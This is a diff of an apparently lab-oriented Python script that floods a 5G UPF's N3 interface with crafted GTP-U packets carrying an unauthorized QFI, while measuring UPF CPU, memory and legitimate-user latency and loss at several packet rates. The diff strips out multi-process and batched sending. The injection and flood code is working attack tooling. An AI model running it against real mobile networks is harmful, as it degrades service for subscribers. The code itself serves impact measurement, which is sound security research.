@@ -16,38 +16,27 @@ import socket
 import subprocess
 import threading
 import time
-from multiprocessing import Process, Value
 
 from inject_qfi_attack import build_gtpu_bytes
 
 RTT_RE = re.compile(r"= [\d.]+/([\d.]+)/([\d.]+)/([\d.]+) ms")
 LOSS_RE = re.compile(r"([\d.]+)% packet loss")
 CPU_RE = re.compile(r"([\d.]+)%")
-
-
-# The always-on speedup is the connected socket + tight send() loop below: a
-# connect()ed UDP socket caches the route and skips per-packet address
-# resolution, which alone lifts a single core from ~44k pps (the old
-# sendto()-per-packet ceiling — the injector's limit, not the UPF's) to
-# ~200k pps. If the runtime also exposes socket.sendmmsg (many datagrams per
-# syscall — note CPython's stdlib socket does NOT), it's used as a further
-# amortization; otherwise the send() path runs. Scale past one core with
-# --workers.
 _BATCH = 1024
 
 
-def _blast(pkt, upf_ip, pps, duration, sent_counter):
-    """One sender worker: pace to ~pps for `duration`s, adding its count to the
-    shared `sent_counter`. Connected socket (cached route, no per-packet address
-    resolution); uses sendmmsg if available, else a plain send() loop."""
+def send_load(pkt, upf_ip, pps, duration):
+    """Send `pkt` toward the UPF N3 at ~pps for `duration`s from one connected
+    UDP socket. Returns achieved pps."""
+    if pps <= 0:
+        time.sleep(duration)
+        return 0.0
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
     except OSError:
         pass
     s.connect((upf_ip, 2152))
-    use_mmsg = hasattr(s, "sendmmsg")
-    msgs = [[pkt]] * _BATCH
     start = time.perf_counter()
     sent = 0
     while True:
@@ -58,37 +47,15 @@ def _blast(pkt, upf_ip, pps, duration, sent_counter):
         if sent < target:
             n = min(_BATCH, target - sent)
             try:
-                if use_mmsg:
-                    sent += s.sendmmsg(msgs[:n])
-                else:
-                    for _ in range(n):
-                        s.send(pkt)
-                    sent += n
+                for _ in range(n):
+                    s.send(pkt)
+                sent += n
             except OSError:
                 time.sleep(0.0001)   # ENOBUFS/EAGAIN under burst: back off briefly
         else:
             time.sleep(0.00005)
     s.close()
-    with sent_counter.get_lock():
-        sent_counter.value += sent
-
-
-def send_load(pkt, upf_ip, pps, duration, workers=1):
-    """Send `pkt` toward the UPF N3 at ~pps for `duration`s across `workers`
-    processes. Returns achieved pps (summed over workers)."""
-    if pps <= 0:
-        time.sleep(duration)
-        return 0.0
-    counter = Value("q", 0)
-    per = max(1, pps // workers)
-    procs = [Process(target=_blast, args=(pkt, upf_ip, per, duration, counter))
-             for _ in range(workers)]
-    start = time.perf_counter()
-    for pr in procs:
-        pr.start()
-    for pr in procs:
-        pr.join()
-    return counter.value / (time.perf_counter() - start)
+    return sent / (time.perf_counter() - start)
 
 
 def sample_upf(stop, cpu_out, mem_out):
@@ -120,14 +87,14 @@ def legit_probe(duration, out):
         out.append(f"(probe failed: {e})")
 
 
-def run_point(pkt, upf_ip, pps, duration, workers=1):
+def run_point(pkt, upf_ip, pps, duration):
     stop = threading.Event()
     cpu, mem, probe = [], [], []
     t_stat = threading.Thread(target=sample_upf, args=(stop, cpu, mem))
     t_ping = threading.Thread(target=legit_probe, args=(duration, probe))
     t_stat.start()
     t_ping.start()
-    achieved = send_load(pkt, upf_ip, pps, duration, workers=workers)
+    achieved = send_load(pkt, upf_ip, pps, duration)
     t_ping.join()
     stop.set()
     t_stat.join()
@@ -158,20 +125,19 @@ def main():
     p.add_argument("--dst", default="192.0.2.1", help="Inner dst; default TEST-NET blackhole (no internet flood, no replies)")
     p.add_argument("--pps", default="0,1000,10000,50000,150000", help="Comma-separated target pps points (0 = baseline)")
     p.add_argument("--duration", type=float, default=12.0, help="Seconds per point")
-    p.add_argument("--workers", type=int, default=1, help="Parallel sender processes (each targets pps/workers). Raise to push past a single core's send ceiling.")
     args = p.parse_args()
 
     pkt = build_gtpu_bytes(args.ue_ip, args.dst, args.teid, args.qfi, 0x4242, 1)
     points = [int(x) for x in args.pps.split(",")]
 
     print(f"UPF forwarding-cost sweep  |  QFI={args.qfi} (unauthorized)  TEID={hex(args.teid)}  "
-          f"inner dst={args.dst}  {args.duration}s/point  workers={args.workers}")
+          f"inner dst={args.dst}  {args.duration}s/point")
     print(f"packet size on wire (GTP-U payload) = {len(pkt)} bytes\n")
     hdr = f"{'target pps':>11} {'achieved pps':>13} {'UPF CPU avg':>12} {'CPU max':>9} {'UPF mem':>10} {'legit RTT avg':>14} {'RTT max':>9} {'loss%':>7}"
     print(hdr)
     print("-" * len(hdr))
     for pps in points:
-        r = run_point(pkt, args.upf_ip, pps, args.duration, workers=args.workers)
+        r = run_point(pkt, args.upf_ip, pps, args.duration)
         print(f"{r['pps_target']:>11} {r['pps_achieved']:>13.0f} {r['cpu_avg']:>11.1f}% {r['cpu_max']:>8.1f}% "
               f"{r['mem']:>10} {r['rtt_avg']:>12.2f}ms {r['rtt_max']:>7.2f}ms {r['loss']:>7.1f}")
 
